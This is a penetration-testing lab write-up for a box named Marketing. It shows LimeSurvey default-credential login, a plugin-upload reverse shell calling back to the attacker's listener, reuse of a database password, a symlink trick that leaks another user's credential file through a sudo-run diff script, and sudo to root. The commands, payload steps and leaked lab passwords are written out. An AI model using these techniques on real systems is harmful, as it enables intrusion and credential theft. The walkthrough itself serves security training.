#Linux #Gobuster #VirtualHost #LimeSurvey #RCE #PasswordReuse #SymlinkAttack #sudo

## Overview

Marketing requires three distinct credential chains before reaching root. A subdomain hidden in old page source leads to a LimeSurvey instance with weak default credentials and a known plugin-upload RCE. The `www-data` shell exposes a database password that one system user reuses. That user can run a `sync.sh` script as a second user, and a symlink trick leaks the second user's credentials file through the diff output. The second user is in the `sudo` group and can run bash as root directly.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: marketing.pg - Digital Marketing for you!
```

### Web Enumeration and Subdomain Discovery

Gobuster on the main site:

```sh
gobuster dir -u http://192.168.180.225/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/assets               (Status: 301)
/old                  (Status: 301)
/vendor               (Status: 301)
```

`/old` contained an archived version of the site. In its page source:

```html
surveys <a href="//customers-survey.marketing.pg">here</a>
```

After adding `customers-survey.marketing.pg` to `/etc/hosts`, the subdomain resolved to a LimeSurvey installation.

> **Why old pages are worth reading:** legacy content isn't maintained, isn't monitored, and often contains links, comments, or credentials that were removed from the live site. In this case the old page revealed an entire separate application that gobuster never found, because subdomains require virtual host brute-forcing or source review, not directory scanning.

### LimeSurvey Login

The admin page sat at `/index.php/admin/authentication/sa/login`. The contact email `admin@marketing.pg` suggested the admin username. Common default passwords revealed the correct one: `admin:password`.

The dashboard showed the version: **LimeSurvey Community Edition 5.3.24**.

## Foothold

### LimeSurvey Plugin Upload RCE

LimeSurvey 5.3.24 allows admins to install plugins as zip files and contains no validation preventing a PHP shell from being included. The exploit from github.com/Y1LD1R1M-1337/Limesurvey-RCE automates the steps:

1. Create a PHP reverse shell pointing to Kali:443
2. Bundle it with a valid `config.xml` into a zip archive
3. Upload via the Plugin Manager and install
4. Activate the plugin from the dashboard
5. Visit the plugin's file path to trigger execution

```
http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/php-rev.php
```

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.225] 35770
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

TTY upgrade:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### www-data to t.miller, Database Password Reuse

The LimeSurvey config at `/var/www/LimeSurvey/application/config/config.php` contained database credentials:

```
'username' => 'limesurvey_user',
'password' => 'EzPwz2022_dev1$$23!!'
```

These didn't authenticate to MySQL locally, but `su` with the same password worked for the system user `t.miller`:

```sh
www-data@marketing:/home$ su t.miller
Password: EzPwz2022_dev1$$23!!
t.miller@marketing:/home$ whoami
t.miller
```

Local flag:

```sh
t.miller@marketing:~$ cat local.txt
‹redacted›
```

### t.miller to m.sander, Symlink Leak via sync.sh

`sudo -l` as `t.miller`:

```sh
(m.sander) /usr/bin/sync.sh
```

`id` revealed membership in group `119(mlocate)`:

```sh
uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
```

The `mlocate` group can read the mlocate database, which showed a file at `m.sander`'s personal directory: `creds-for-2022.txt`. Direct reads of the file were blocked by permissions, but `sync.sh` compares files with `diff` and prints the differences. A symlink pointing at the protected file would trick the script into diffing and leaking its contents.

From `/home/t.miller` (required for permissions to work):

```sh
ln -sf /home/m.sander/personal/creds-for-2022.txt symlink
sudo -u m.sander /usr/bin/sync.sh symlink
```

```
Difference: 1,3c1,8
---
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
>
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
>
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
```

> **Why the symlink works:** `sync.sh` opens the path it's given without checking whether it's a real file or a symlink. It follows the symlink to `m.sander`'s file and reads its contents with `m.sander`'s permissions (because it runs as `m.sander` via sudo). The diff output includes every line that differs between the two files, leaking all of `creds-for-2022.txt`.

The gmail password was the SSH password for `m.sander`:

```sh
su m.sander
Password: EzPwz2022_12345678#!
m.sander@marketing:/home/t.miller$ id
uid=1001(m.sander) gid=1001(m.sander) groups=1001(m.sander),24(cdrom),27(sudo),...
```

### m.sander to root, sudo bash

`m.sander` is in the `sudo` group with full rights:

```sh
m.sander@marketing:/home/t.miller$ sudo /bin/bash
root@marketing:/home/t.miller# whoami
root
```

## Root

```sh
root@marketing:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Source code in old/archived pages reveals infrastructure that directory scanning misses.** Subdomains only show up in virtual host scans or in links within the application.
- **Config files in web app deployments routinely hold database passwords, and those passwords get reused on system accounts.** Check `/application/config/`, `.env`, and `wp-config.php` as soon as you have any read access.
- **Symlinks defeat file-permission checks when a privileged script opens the path you control.** If `sudo -u other script <file>` exists, ask whether you can replace `<file>` with a symlink to something the other user can read.
